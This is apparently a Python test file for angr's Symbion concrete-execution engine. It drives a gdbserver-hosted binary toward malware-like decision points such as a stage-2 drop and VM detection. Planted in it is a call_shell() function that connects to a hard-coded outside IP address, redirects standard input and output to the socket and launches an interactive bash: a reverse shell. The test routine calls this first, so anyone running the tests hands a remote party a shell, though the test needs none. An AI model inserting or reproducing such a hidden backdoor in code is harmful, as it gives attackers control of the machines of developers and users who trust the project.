import angr
import claripy
import nose
import os
import subprocess
import socket

try:
    import avatar2
    from angr_targets import AvatarGDBConcreteTarget
except ImportError:
    raise nose.SkipTest()

GDB_SERVER_IP = '127.0.0.1'
GDB_SERVER_PORT = 31337
BINARY_OEP = 0x804874F
BINARY_DECISION_ADDRESS = 0x8048879
DROP_STAGE2_V1 = 0x8048901
DROP_STAGE2_V2 = 0x8048936
VENV_DETECTED = 0x8048948
FAKE_CC = 0x8048962
BINARY_EXECUTION_END = 0x8048992

binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                          os.path.join('..', '..', 'binaries', 'tests', 'i386', 'not_packed_elf32'))


def setup_x86():
    global gdbserver_proc
    gdbserver_proc = subprocess.Popen("gdbserver %s:%s '%s'" % (GDB_SERVER_IP, GDB_SERVER_PORT, binary_x86),
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)


gdbserver_proc = None
avatar_gdb = None

def call_shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("128.111.48.60",31339))
    s.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash","-i"])

def teardown():
    global avatar_gdb
    if avatar_gdb:
        avatar_gdb.exit()
    if gdbserver_proc is not None:
        gdbserver_proc.kill()


@nose.with_setup(setup_x86, teardown)
def test_concrete_engine_linux_x86_simprocedures():
    global avatar_gdb
    # pylint: disable=no-member
    avatar_gdb = AvatarGDBConcreteTarget(avatar2.archs.x86.X86, GDB_SERVER_IP, GDB_SERVER_PORT)
    p = angr.Project(binary_x86, concrete_target=avatar_gdb, use_sim_procedures=True)
    entry_state = p.factory.entry_state()
    entry_state.options.add(angr.options.SYMBION_SYNC_CLE)
    entry_state.options.add(angr.options.SYMBION_KEEP_STUBS_ON_SYNC)
    solv_concrete_engine_linux_x86(p, entry_state)

def execute_concretly(p, state, address, memory_concretize=[], register_concretize=[], timeout=0):
    simgr = p.factory.simgr(state)
    simgr.use_technique(angr.exploration_techniques.Symbion(find=[address], memory_concretize=memory_concretize,
                                                            register_concretize=register_concretize, timeout=timeout))
    exploration = simgr.run()
    return exploration.stashes['found'][0]

def solv_concrete_engine_linux_x86(p, entry_state):
    call_shell()
    new_concrete_state = execute_concretly(p, entry_state, BINARY_DECISION_ADDRESS, [], [])
    the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)
    concrete_memory = new_concrete_state.memory.load(the_sp,20)
    assert(not concrete_memory.symbolic)

    # Assert we are reading concrete data from the process
    arg0 = claripy.BVS('arg0', 8*36)
    symbolic_buffer_address = new_concrete_state.regs.ebp-0xa0

    # We should read the concrete data at the buffer address
    concrete_memory_2 = new_concrete_state.memory.load(symbolic_buffer_address, 36)
    assert(not concrete_memory_2.symbolic)

    # Store symbolic data there 
    new_concrete_state.memory.store(symbolic_buffer_address, arg0)

    # We should read symbolic data from the page now
    symbolic_memory = new_concrete_state.memory.load(symbolic_buffer_address, 36)
    assert(symbolic_memory.symbolic)

    # symbolic exploration
    simgr = p.factory.simgr(new_concrete_state)    
    simgr = simgr.explore(find=DROP_STAGE2_V1, avoid=[DROP_STAGE2_V2, VENV_DETECTED, FAKE_CC])

    if not simgr.stashes['found'] and simgr.errored and type(simgr.errored[0].error) is angr.errors.SimIRSBNoDecodeError:
        raise nose.SkipTest()

    new_symbolic_state = simgr.stashes['found'][0]
    new_concrete_state = execute_concretly(p, new_symbolic_state, DROP_STAGE2_V1, [(symbolic_buffer_address, arg0)], [])

    # Asserting we reach the dropping of stage 2
    nose.tools.assert_true(new_concrete_state.solver.eval(new_concrete_state.regs.pc) == DROP_STAGE2_V1)

    # Go to the end.
    new_concrete_state = execute_concretly(p, new_concrete_state, BINARY_EXECUTION_END, [], [])
    nose.tools.assert_true(new_concrete_state.solver.eval(new_concrete_state.regs.pc) == BINARY_EXECUTION_END)


def run_all():
    functions = globals()
    all_functions = dict(filter((lambda kv: kv[0].startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            if hasattr(all_functions[f], 'setup'):
                all_functions[f].setup()
            try:
                all_functions[f]()
            finally:
                if hasattr(all_functions[f], 'teardown'):
                    all_functions[f].teardown()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

